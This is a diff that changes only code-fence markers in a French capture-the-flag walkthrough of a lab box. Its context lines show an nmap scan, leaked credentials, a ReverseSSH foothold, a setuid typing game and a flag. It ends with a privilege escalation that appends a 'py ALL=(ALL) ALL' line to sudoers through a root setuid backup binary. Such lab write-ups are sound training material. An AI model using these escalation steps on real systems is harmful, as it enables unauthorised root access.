@@ -10,7 +10,7 @@ Marmelade
 
 Ici nous aurons aussi l'occasion de nous pencher sur deux binaires setuid.
 
-```plain
+```
 
 Nmap scan report for 192.168.56.21
 Host is up (0.00018s latency).
@@ -52,7 +52,7 @@ On pourrait sans doute brute forcer le nom d'utilisateur jusqu'à en trouver un 
 
 Là on trouve les identifiants suivants :
 
-```plain
+```
 
 Username: steve
 Password: bvbkukHAeVxtjjVH
@@ -79,13 +79,13 @@ Confiture de cerise
 
 Une fois le [ReverseSSH](https://github.com/Fahrj/reverse-ssh "ReverseSSH") mis en place je peux fouiller ce qui se passe sur le système. Il y a par exemple un serveur Redis en place :
 
-```plain
+```
 redis        188  0.3  0.9  58020  9616 ?        Ssl  20:46   0:04 /usr/bin/redis-server 127.0.0.1:6379
 ```
 
 Mais il ne semble lié qu'aux captchas de la page de login :
 
-```plain
+```
 
 $ redis-cli
 127.0.0.1:6379> INFO keyspace
@@ -109,7 +109,7 @@ hash
 
 En revanche il y a un utilisateur nommé *py* qui semble être notre prochaine victime :
 
-```plain
+```
 
 [http@archlinux /]$ ls /home/py/ -al
 total 56
@@ -164,7 +164,7 @@ Ca semble trop simple, on se demande où pourrait être le piège surtout qu'un 
 
 Je copie colle juste le texte.
 
-```plain
+```
 
 [http@archlinux /]$ /home/py/typing 
 Let's play a game! If you can type the sentence below, then I'll tell you my password.
@@ -181,7 +181,7 @@ uid=1000(py) gid=1000(py) groups=1000(py)
 
 Okayyyyyyyyyyy ! Aucune difficulté donc.
 
-```plain
+```
 
 [py@archlinux ~]$ cat user.txt 
 ee11cbb19052e40b07aac0ca060c23ee
@@ -193,7 +193,7 @@ Miel
 
 On trouve un second binaire setuid mais cette fois pour root :
 
-```plain
+```
 
 [py@archlinux ~]$ ls secret_stuff/ -l
 total 32
@@ -234,7 +234,7 @@ L'exécutable semble demander une ligne et un nom de fichier puis rajoute la lig
 
 Le path saisit doit commencer par /srv/backups/ et grace à un fichier présent on peut vérifier le comportement du programme.
 
-```plain
+```
 
 [py@archlinux secret_stuff]$ cat /srv/backups/ree 
 hello reeehello hello
@@ -251,7 +251,7 @@ mytest
 
 Il y a plein de méthodes sous Linux pour obtenir une escalade de privilège via l'ajout de lignes dans un fichier (/etc/passwd, crontab, etc), j'ai opté pour le fichier *sudoers*.
 
-```plain
+```
 
 [py@archlinux secret_stuff]$ ./backup 
 Enter a line of text to back up: py ALL=(ALL) ALL
